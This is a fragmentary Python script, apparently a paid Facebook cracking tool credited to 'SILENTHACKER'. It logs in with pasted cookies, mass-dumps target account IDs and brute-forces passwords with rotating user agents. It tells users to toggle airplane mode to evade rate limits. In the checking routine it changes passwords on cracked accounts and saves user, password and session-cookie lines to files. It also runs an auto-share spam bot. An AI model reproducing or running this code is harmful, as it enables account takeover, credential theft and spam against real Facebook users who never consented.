...
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
...
{m}╚══╝╚══╝╚═╝╚═╝╚╩═╝─╚╝─  ╚╝╚╝╚╝╚╝╚═╝╚╩╝╚═╝╚╩╝  ..#
{P}──────────────────────  ────────────────────  ..#
{P}Author: SILENTHACKER ...........................#
{P}Github: SILENTHACKER804 ........................#
{P}Facebook:  SILENTHACKER ........................#
{m}Whatsap: +2348107530704.........................#
{m}Tool type:  Paid................................#
{P}#################################################""")
#--------------------[ BAGIAN-MASUK ]--------------#
os.system('clear')
...
def login_lagi334():
	try:
		banner()
		print('='*51)
		print('Recommended Cookies That Are Still Fresh To Crack Fb ')
		print('='*51)
		your_cookies = input('╰─  Enter Cookies : ')
		with requests.Session() as r:
			try:
				...
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-dest': 'document',})
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n ╰─  Login Successful | python SILENT.py");exit()
			except Exception as e:
				print(" ╰─  Mokad Cock Cookies")
...
def menu(NAME,ID):
	...
	print('='*51)
	print('='*51)
	print(f'Ketik "Bot" To Go To Additional Menus In This Script')
	print('='*51)
	...
	if _____rifan__ganteng_____ in ['1']:
		...
		print('└─ Logout Success+Delete Cookies ')
		exit()
	else:
...
def bot():
	...
	print('='*51)
	print('='*51)
	rfn = input(f' [+] Select Crack Menu : ')
	print('='*51)
	if rfn in(''):
		print(' [+] Choose the Right Asu ')
		time.sleep(3)
		back()
	if rfn in('1','01'):
		memek()
...
def dump_massal():
	...
	try:
		print('='*51)
		jum = int(input(f'{M}{P}What are the targets? : '))
		print('='*51)
	except ValueError:
		print(' Enter Numbers Instead Of Letters ')
		exit()
	if jum<1 or jum>100:
		print(f'{M}[{H}x{M}]Failed Dump ID ')
		exit()
	ses=requests.Session()
	yz = 0
	...
	for userr in uid:
		try:
			...
			print('>> Loh Kek Kontoll signal ')
			exit()
	try:
		print('='*51)
		print(f'Collected🔥'+str(len(id)))
		print('='*51)
		setting()
	except requests.exceptions.ConnectionError:
		print(f'Cock cake signal ')
		back()
	except (KeyError,IOError):
		print(f'Unlisted Friendship ')
		time.sleep(3)
		back()
		setting()
#----------------------[ CRACK USERNAME ]----------------------#
...
def dump_id():		
	...
	try:
		...
		print('')
		print('='*51)
		print(f"managed to dump id from public");print(f"salin output file + [ %s%s%s ]"%(H,wkwk,P))
		print('='*51)
		exit()
		...
		os.remove(wkwk)
		print('='*51)
		print(f"Failed dump id, probably id doesn't exist")
		print('='*51)
		exit()
#--------[SIU]--------#
def siu():
...
def memek():
	try:
		...
		exit()
	print('='*51)
	link = input(f" [+] Enter post link : ")
	print('='*51)
	print('='*51)
	jumlah = int(input(f" [+] Enter Shares : "))
	print('='*51)
	memek = datetime.now()
	try:
		n = 0
		...
		for x in range(jumlah):
			...
			if "id" in post:
				...
				print(f'\r [+] Successful Men Share {n} post',end='')
				sys.stdout.flush()
			else:
				print("\n")
				print(f'Bot Auto Share Has Stopped Maybe Because Cookie Has Mokad');exit()
	except requests.exceptions.ConnectionError:
		print(f"\n [+] You Are Not Connected To The Internet");exit()
#-----------------------[ DEFF SCRAPT METODE ]--------------------#
...
def setting():
	...
	print('2. Young Account ')
	print('3. Account Random ')
	print('='*51)
	hu = input('└─ Pilih : ')
	if hu in ['1','01']:
	...
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	print('='*51)
	uaplus=input('Add User Agent Manual ( Y/t ) ')
	print('='*51)
	if uaplus in ['y','Y']:
		uapluss.append('ya')
		print('='*51)
		uaku=input('Enter Additional User Agent : ')
		uakuh=uaku.split(',')
		for xua in uakuh:
			uanya.append(xua)
	else:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print('='*51)
		print('Enter an additional password of at least 6 characters\n Example: brother, sister, brother')
		print('='*51)
		print('='*51)
...
def passwrd():
	...
	print(f'>> Play Airplane Mode Every {m}500{x} Idz')
	print('='*51)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rSILENT {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s%s\033[0m\033[0mPilih Crack Results Saved To Check Options %s\n"%(U,til,O,U,O))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0mEnter files [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s\033[0mMissing Files'%(M,til))
		exit()
...
def opsi():
	...
	if romi == "":
		print(" [+] Correct Contents "%(M,til));jeda(2)
		back()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s\033[0mNama File %s\033[0m Not available"%(M,til,romi))
	jalan("%s%s%s\033[0m5 Seconds Pre-Airplane Mode "%(U,til,O))
	pw=input("\n%s%s%s\033[0mChange Password On One Tab Account? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s\033[0mEnter Password %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s Minimum 6 Character Password "%(M,til))
		else:
			pwbaru.append(pw2)
	print ("%s%s%s\033[0m Account Totals %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s\033[0mAccount Login %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s\033[0mDone Checking Account"%(U,til,O));jeda(0.07)
...
def mengecek(user,pw):
	...
	if "c_user" in session.cookies.get_dict():
		if "Your account is locked" in urlPost.text:
			print("\r%s%s\033[0m New Session Locked Account"%(M,til))
		else:
			print("\r%s%s\033[0m Account Not Checkpoint, Please Login "%(til,H))
		...
		number=0
		print("\r%s [+] %s\033[0mthere is %s%s%s \033[0moption %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "View Login Details Displayed.  This you?" in title:
				if "ubah_sandi" in ubah_pass:
					...
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						...
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0mOne Tab Account, Data Changed Successfully \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0mOne Tab Account, Please Login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Enter Login Code to Continue" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s [+] \033[0mAccount Installed Two Factor Authentication			"%(M))
			else:
				print("%s%s\033[0mThere is an error"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s Account Not Checkpoint, Please Login "%(H))
		...
		print("%s [+] \033[0mLogin Failed, Please Check Id And Password Again"%(M))
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	...
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh there are no active applications in this account.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Added on"," Added on"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh there are no expired apps in this account.")
	else:
		for i in range(len(game)):
